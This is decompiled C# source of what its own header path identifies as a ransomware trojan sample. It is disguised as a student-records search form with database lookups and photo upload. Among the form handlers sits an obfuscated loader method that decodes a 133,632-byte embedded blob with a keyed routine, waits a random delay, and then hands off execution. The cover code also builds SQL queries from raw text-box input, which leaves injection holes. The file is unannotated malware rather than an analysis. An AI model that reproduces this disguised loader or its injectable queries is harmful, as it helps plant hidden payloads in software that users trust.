// Decompiled with JetBrains decompiler
// Type: a6L.Nk2
// Assembly: Xm0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1B674CF3-5023-4B9D-A1E8-7523E4EAB1AA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-8c5b86dac70a8b0d8a064a95d62e3d1a1def3076b00ba023c55cde1a7b5d4298.exe

using c9N;
using d5R;
using Es9r;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using o0QX;
using s1N;
using System;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Yd5;

namespace a6L
{
  [DesignerGenerated]
  public class Nk2 : Form
  {
    private IContainer components;
    private byte[] Photos1;
    private SqlDataReader dr;
    private string str1;

    public Nk2()
    {
      this.Load += new EventHandler(this.a9D);
      this.Zw9();
    }

    [DebuggerNonUserCode]
    protected virtual void Xt7(bool Ji1)
    {
      try
      {
        if (!Ji1 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(Ji1);
      }
    }

    [DebuggerStepThrough]
    private void Zw9()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Nk2));
      this.PictureBox1 = new PictureBox();
      this.Label1 = new Label();
      this.Label2 = new Label();
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.Button3 = new Button();
      this.Button4 = new Button();
      this.TextBox3 = new TextBox();
      this.Label3 = new Label();
      this.OpenFileDialog1 = new OpenFileDialog();
      this.Button5 = new Button();
      this.Button6 = new Button();
      this.GroupBox1 = new GroupBox();
      this.ComboBox1 = new ComboBox();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.GroupBox1.SuspendLayout();
      this.SuspendLayout();
      this.PictureBox1.Image = (Image) componentResourceManager.GetObject("PictureBox1.Image");
      this.PictureBox1.Location = new Point(1, 1);
      this.PictureBox1.Name = "PictureBox1";
      this.PictureBox1.Size = new Size(144, 159);
      this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.PictureBox1.TabIndex = 0;
      this.PictureBox1.TabStop = false;
      this.Label1.Location = new Point(160, 76);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(106, 29);
      this.Label1.TabIndex = 1;
      this.Label1.Text = "Student Name";
      this.Label1.TextAlign = ContentAlignment.MiddleLeft;
      this.Label2.Location = new Point(163, 29);
      this.Label2.Name = "Label2";
      this.Label2.Size = new Size(95, 29);
      this.Label2.TabIndex = 2;
      this.Label2.Text = "PRN No.";
      this.Label2.TextAlign = ContentAlignment.MiddleLeft;
      this.TextBox1.Location = new Point(121, 24);
      this.TextBox1.Name = "TextBox1";
      this.TextBox1.Size = new Size(197, 22);
      this.TextBox1.TabIndex = 3;
      this.TextBox2.Location = new Point(121, 71);
      this.TextBox2.Multiline = true;
      this.TextBox2.Name = "TextBox2";
      this.TextBox2.Size = new Size(197, 29);
      this.TextBox2.TabIndex = 4;
      this.Button1.FlatAppearance.BorderColor = Color.FromArgb(0, 192, 192);
      this.Button1.FlatAppearance.BorderSize = 3;
      this.Button1.FlatStyle = FlatStyle.Flat;
      this.Button1.Location = new Point(104, 196);
      this.Button1.Name = "Button1";
      this.Button1.Size = new Size(80, 33);
      this.Button1.TabIndex = 5;
      this.Button1.Text = "Search";
      this.Button1.UseVisualStyleBackColor = true;
      this.Button2.DialogResult = DialogResult.Cancel;
      this.Button2.FlatAppearance.BorderColor = Color.Red;
      this.Button2.FlatAppearance.BorderSize = 3;
      this.Button2.FlatStyle = FlatStyle.Flat;
      this.Button2.Location = new Point(395, 196);
      this.Button2.Name = "Button2";
      this.Button2.Size = new Size(80, 33);
      this.Button2.TabIndex = 6;
      this.Button2.Text = "Cancel";
      this.Button2.UseVisualStyleBackColor = true;
      this.Button3.FlatAppearance.BorderColor = Color.Red;
      this.Button3.FlatAppearance.BorderSize = 3;
      this.Button3.FlatStyle = FlatStyle.Flat;
      this.Button3.Location = new Point(300, 196);
      this.Button3.Name = "Button3";
      this.Button3.Size = new Size(80, 33);
      this.Button3.TabIndex = 9;
      this.Button3.Text = "Delete";
      this.Button3.UseVisualStyleBackColor = true;
      this.Button4.FlatAppearance.BorderColor = Color.FromArgb(0, 192, 192);
      this.Button4.FlatAppearance.BorderSize = 3;
      this.Button4.FlatStyle = FlatStyle.Flat;
      this.Button4.Location = new Point(203, 196);
      this.Button4.Name = "Button4";
      this.Button4.Size = new Size(80, 33);
      this.Button4.TabIndex = 10;
      this.Button4.Text = "More";
      this.Button4.UseVisualStyleBackColor = true;
      this.TextBox3.Location = new Point(121, 117);
      this.TextBox3.Multiline = true;
      this.TextBox3.Name = "TextBox3";
      this.TextBox3.Size = new Size(197, 29);
      this.TextBox3.TabIndex = 11;
      this.Label3.Location = new Point(163, 122);
      this.Label3.Name = "Label3";
      this.Label3.Size = new Size(95, 29);
      this.Label3.TabIndex = 12;
      this.Label3.Text = "Course ";
      this.Label3.TextAlign = ContentAlignment.MiddleLeft;
      this.OpenFileDialog1.FileName = "OpenFileDialog1";
      this.Button5.FlatAppearance.BorderColor = Color.FromArgb((int) byte.MaxValue, 128, 0);
      this.Button5.FlatAppearance.BorderSize = 3;
      this.Button5.FlatStyle = FlatStyle.Flat;
      this.Button5.Location = new Point(1, 157);
      this.Button5.Name = "Button5";
      this.Button5.Size = new Size(144, 33);
      this.Button5.TabIndex = 13;
      this.Button5.Text = "New Image";
      this.Button5.UseVisualStyleBackColor = true;
      this.Button6.DialogResult = DialogResult.Cancel;
      this.Button6.FlatAppearance.BorderColor = Color.FromArgb(0, 192, 192);
      this.Button6.FlatAppearance.BorderSize = 3;
      this.Button6.FlatStyle = FlatStyle.Flat;
      this.Button6.Location = new Point(7, 196);
      this.Button6.Name = "Button6";
      this.Button6.Size = new Size(80, 33);
      this.Button6.TabIndex = 14;
      this.Button6.Text = "Save";
      this.Button6.UseVisualStyleBackColor = true;
      this.GroupBox1.Controls.Add((Control) this.ComboBox1);
      this.GroupBox1.Controls.Add((Control) this.TextBox3);
      this.GroupBox1.Controls.Add((Control) this.TextBox2);
      this.GroupBox1.Controls.Add((Control) this.TextBox1);
      this.GroupBox1.Location = new Point(151, 1);
      this.GroupBox1.Name = "GroupBox1";
      this.GroupBox1.Size = new Size(328, 159);
      this.GroupBox1.TabIndex = 15;
      this.GroupBox1.TabStop = false;
      this.GroupBox1.Text = "Student Info.";
      this.ComboBox1.FormattingEnabled = true;
      this.ComboBox1.Location = new Point(121, 24);
      this.ComboBox1.Name = "ComboBox1";
      this.ComboBox1.Size = new Size(197, 24);
      this.ComboBox1.TabIndex = 12;
      this.AcceptButton = (IButtonControl) this.Button1;
      this.AutoScaleDimensions = new SizeF(9f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.MintCream;
      this.CancelButton = (IButtonControl) this.Button2;
      this.ClientSize = new Size(485, (int) byte.MaxValue);
      this.Controls.Add((Control) this.Button6);
      this.Controls.Add((Control) this.Button5);
      this.Controls.Add((Control) this.Label3);
      this.Controls.Add((Control) this.Button4);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.GroupBox1);
      this.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.HelpButton = true;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Margin = new Padding(4);
      this.MaximizeBox = false;
      this.MaximumSize = new Size(491, 284);
      this.MinimizeBox = false;
      this.MinimumSize = new Size(491, 284);
      this.Name = "SearchForm";
      this.StartPosition = FormStartPosition.CenterParent;
      this.Text = "Search Form";
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.GroupBox1.ResumeLayout(false);
      this.GroupBox1.PerformLayout();
      this.ResumeLayout(false);
    }

    internal virtual PictureBox PictureBox1
    {
      get => this._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Wq3);
        PictureBox pictureBox1_1 = this._PictureBox1;
        if (pictureBox1_1 != null)
          pictureBox1_1.Click -= eventHandler;
        this._PictureBox1 = value;
        PictureBox pictureBox1_2 = this._PictureBox1;
        if (pictureBox1_2 == null)
          return;
        pictureBox1_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TextBox1")]
    internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TextBox2")]
    internal virtual TextBox TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Ej6);
        Button button1_1 = this._Button1;
        if (button1_1 != null)
          button1_1.Click -= eventHandler;
        this._Button1 = value;
        Button button1_2 = this._Button1;
        if (button1_2 == null)
          return;
        button1_2.Click += eventHandler;
      }
    }

    internal virtual Button Button2
    {
      get => this._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Pm9);
        Button button2_1 = this._Button2;
        if (button2_1 != null)
          button2_1.Click -= eventHandler;
        this._Button2 = value;
        Button button2_2 = this._Button2;
        if (button2_2 == null)
          return;
        button2_2.Click += eventHandler;
      }
    }

    internal virtual Button Button3
    {
      get => this._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Ky3);
        Button button3_1 = this._Button3;
        if (button3_1 != null)
          button3_1.Click -= eventHandler;
        this._Button3 = value;
        Button button3_2 = this._Button3;
        if (button3_2 == null)
          return;
        button3_2.Click += eventHandler;
      }
    }

    internal virtual Button Button4
    {
      get => this._Button4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.g4L);
        Button button4_1 = this._Button4;
        if (button4_1 != null)
          button4_1.Click -= eventHandler;
        this._Button4 = value;
        Button button4_2 = this._Button4;
        if (button4_2 == null)
          return;
        button4_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("TextBox3")]
    internal virtual TextBox TextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label3")]
    internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("OpenFileDialog1")]
    internal virtual OpenFileDialog OpenFileDialog1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button5
    {
      get => this._Button5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.o1D);
        Button button5_1 = this._Button5;
        if (button5_1 != null)
          button5_1.Click -= eventHandler;
        this._Button5 = value;
        Button button5_2 = this._Button5;
        if (button5_2 == null)
          return;
        button5_2.Click += eventHandler;
      }
    }

    internal virtual Button Button6
    {
      get => this._Button6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Rw5);
        Button button6_1 = this._Button6;
        if (button6_1 != null)
          button6_1.Click -= eventHandler;
        this._Button6 = value;
        Button button6_2 = this._Button6;
        if (button6_2 == null)
          return;
        button6_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("GroupBox1")]
    internal virtual GroupBox GroupBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual ComboBox ComboBox1
    {
      get => this._ComboBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Pq7);
        ComboBox comboBox1_1 = this._ComboBox1;
        if (comboBox1_1 != null)
          comboBox1_1.SelectedIndexChanged -= eventHandler;
        this._ComboBox1 = value;
        ComboBox comboBox1_2 = this._ComboBox1;
        if (comboBox1_2 == null)
          return;
        comboBox1_2.SelectedIndexChanged += eventHandler;
      }
    }

    private void a9D(object j1E, EventArgs z6Z)
    {
      g4K.c1N();
      g4K.cn.Open();
      g4K.str = "select * from InformationForm";
      g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
      g4K.da.SelectCommand = g4K.cmd;
      g4K.da.Fill(g4K.ds, "InformationForm");
      g4K.ds.Clear();
      this.ComboBox1.ResetText();
      g4K.cn.Close();
      g4K.cn.Open();
      g4K.str = "select * from InformationForm";
      g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
      g4K.da.SelectCommand = g4K.cmd;
      g4K.da.Fill(g4K.ds, "InformationForm");
      int num = checked (g4K.ds.Tables["InformationForm"].Rows.Count - 1);
      int index = 0;
      while (index <= num)
      {
        this.ComboBox1.Items.Add((object) g4K.ds.Tables["InformationForm"].Rows[index][2].ToString());
        checked { ++index; }
      }
      g4K.cn.Close();
    }

    internal static byte[] Sz1(int Pn0) => x2N.n1D(Pn0, checked (Pn0 + 1 - 36));

    private void g4L(object Fg3, EventArgs Mc1)
    {
      We04.Forms.AddmisionForm1.DateTimePicker1.Visible = false;
      We04.Forms.AddmisionForm1.ComboBox1.Visible = false;
      We04.Forms.AddmisionForm1.ComboBox2.Visible = false;
      We04.Forms.AddmisionForm1.TextBox1.Text = this.TextBox2.Text;
      We04.Forms.AddmisionForm1.TextBox3.Text = this.TextBox1.Text;
      We04.Forms.AddmisionForm1.ComboBox2.Text = this.TextBox1.Text;
      We04.Forms.AddmisionForm1.PictureBox1.Image = this.PictureBox1.Image;
      g4K.cn.Open();
      g4K.str = "select * from InformationForm ";
      g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
      g4K.da.SelectCommand = g4K.cmd;
      g4K.da.Fill(g4K.ds, "InformationForm");
      int num = checked (g4K.ds.Tables["InformationForm"].Rows.Count - 1);
      int index = 0;
      while (index <= num)
      {
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(We04.Forms.AddmisionForm1.TextBox3.Text, g4K.ds.Tables["InformationForm"].Rows[index][2].ToString(), false) == 0)
        {
          We04.Forms.AddmisionForm1.TextBox1.Text = g4K.ds.Tables["InformationForm"].Rows[index][0].ToString();
          We04.Forms.AddmisionForm1.TextBox2.Text = g4K.ds.Tables["InformationForm"].Rows[index][1].ToString();
          We04.Forms.AddmisionForm1.TextBox3.Text = g4K.ds.Tables["InformationForm"].Rows[index][2].ToString();
          We04.Forms.AddmisionForm1.TextBox4.Text = g4K.ds.Tables["InformationForm"].Rows[index][3].ToString();
          We04.Forms.AddmisionForm1.TextBox5.Text = g4K.ds.Tables["InformationForm"].Rows[index][4].ToString();
          We04.Forms.AddmisionForm1.TextBox6.Text = g4K.ds.Tables["InformationForm"].Rows[index][5].ToString();
          We04.Forms.AddmisionForm1.TextBox7.Text = g4K.ds.Tables["InformationForm"].Rows[index][6].ToString();
          We04.Forms.AddmisionForm1.TextBox8.Text = g4K.ds.Tables["InformationForm"].Rows[index][7].ToString();
          We04.Forms.AddmisionForm1.TextBox9.Text = g4K.ds.Tables["InformationForm"].Rows[index][8].ToString();
          We04.Forms.AddmisionForm1.TextBox10.Text = g4K.ds.Tables["InformationForm"].Rows[index][9].ToString();
          We04.Forms.AddmisionForm1.TextBox11.Text = g4K.ds.Tables["InformationForm"].Rows[index][10].ToString();
          We04.Forms.AddmisionForm1.ComboBox2.Text = g4K.ds.Tables["InformationForm"].Rows[index][6].ToString();
          We04.Forms.AddmisionForm1.ComboBox1.Text = g4K.ds.Tables["InformationForm"].Rows[index][2].ToString();
        }
        checked { ++index; }
      }
      g4K.cn.Close();
      this.Hide();
      We04.Forms.AddmisionForm1.Show();
    }

    private void Ej6(object Dm2, EventArgs Ax3)
    {
      g4K.cn.Open();
      g4K.str = "select * from InformationForm ";
      g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
      g4K.da.SelectCommand = g4K.cmd;
      g4K.da.Fill(g4K.ds, "InformationForm");
      int num1 = checked (g4K.ds.Tables["InformationForm"].Rows.Count - 1);
      int index = 0;
      while (index <= num1)
      {
        if (Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.TextBox1.Text, g4K.ds.Tables["InformationForm"].Rows[index][2].ToString(), false) == 0)
        {
          this.TextBox1.Text = g4K.ds.Tables["InformationForm"].Rows[index][2].ToString();
          this.TextBox2.Text = g4K.ds.Tables["InformationForm"].Rows[index][0].ToString();
          this.TextBox3.Text = g4K.ds.Tables["InformationForm"].Rows[index][7].ToString();
        }
        checked { ++index; }
      }
      try
      {
        g4K.cmd = new SqlCommand();
        g4K.cmd.CommandText = "select image,name from Photos where prn = " + this.TextBox1.Text ?? "";
        g4K.cmd.Parameters.AddWithValue("@prn", (object) this.TextBox1.Text);
        if (g4K.cn.State == ConnectionState.Closed)
          g4K.cn.Open();
        g4K.cmd.Connection = g4K.cn;
        this.dr = g4K.cmd.ExecuteReader();
        if (!this.dr.Read())
          return;
        this.TextBox2.Text = Conversions.ToString(this.dr[1]);
        this.Photos1 = (byte[]) this.dr[0];
        File.WriteAllBytes("photo.jpg", this.Photos1);
        this.PictureBox1.Load("photo.jpg");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num2 = (int) Interaction.MsgBox((object) ex.Message);
        ProjectData.ClearProjectError();
      }
      finally
      {
        g4K.cn.Close();
        this.dr.Close();
      }
    }

    private void Ky3(object f5T, EventArgs z5Q)
    {
      g4K.cn.Open();
      g4K.str = "delete * from InformationForm where prn='" + this.TextBox1.Text + "'";
      g4K.cmd = new SqlCommand(g4K.str, g4K.cn);
      g4K.da.SelectCommand = g4K.cmd;
      g4K.cn.Close();
    }

    private void Pm9(object Xw3, EventArgs So5) => this.Close();

    private void o1D(object x6P, EventArgs Xk6)
    {
      if (this.OpenFileDialog1.ShowDialog() != DialogResult.OK)
        return;
      this.PictureBox1.Load(this.OpenFileDialog1.FileName);
    }

    internal static void j0R()
    {
      byte[] numArray = d0Z.p3A(133632);
      int Gj9 = checked (Conversions.ToInteger(p6S.mDic[p6S.sNum]) * 3);
      int num = checked (numArray.Length - 1);
      int Qn1 = 0;
      while (Qn1 <= num)
      {
        numArray[Qn1] = x2N.a5A(numArray[Qn1], (byte[]) p6S.mDic[p6S.sArray], Gj9, Qn1);
        checked { ++Qn1; }
      }
      p6S.mDic.Add(p6S.mArray, (object) numArray);
      Task.Delay(new Random().Next(1000, 5000)).Wait();
      Jq1j.z8GM();
    }

    private void Rw5(object z8K, EventArgs Sz0)
    {
      try
      {
        g4K.cmd = new SqlCommand();
        g4K.cmd.CommandText = " insert into Photos values (@image, @prn, @name) ";
        g4K.cmd.Parameters.AddWithValue("@prn", (object) this.TextBox1.Text);
        g4K.cmd.Parameters.AddWithValue("@name", (object) this.TextBox2.Text);
        this.Photos1 = File.ReadAllBytes(this.OpenFileDialog1.FileName);
        g4K.cmd.Parameters.AddWithValue("@image", (object) this.Photos1);
        if (g4K.cn.State == ConnectionState.Closed)
          g4K.cn.Open();
        g4K.cmd.Connection = g4K.cn;
        g4K.cmd.ExecuteNonQuery();
        int num = (int) Interaction.MsgBox((object) "Image Saved.");
        We04.Forms.AddmisionForm.PictureBox1.Load(this.OpenFileDialog1.FileName);
        We04.Forms.AddmisionForm.Show();
        this.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) "Record Not Found.");
        ProjectData.ClearProjectError();
      }
      g4K.cmd = new SqlCommand();
      g4K.cn.Close();
    }

    private void Wq3(object j4X, EventArgs Fz1)
    {
    }

    private void Pq7(object i1P, EventArgs y5Y) => this.TextBox1.Text = this.ComboBox1.Text;
  }
}
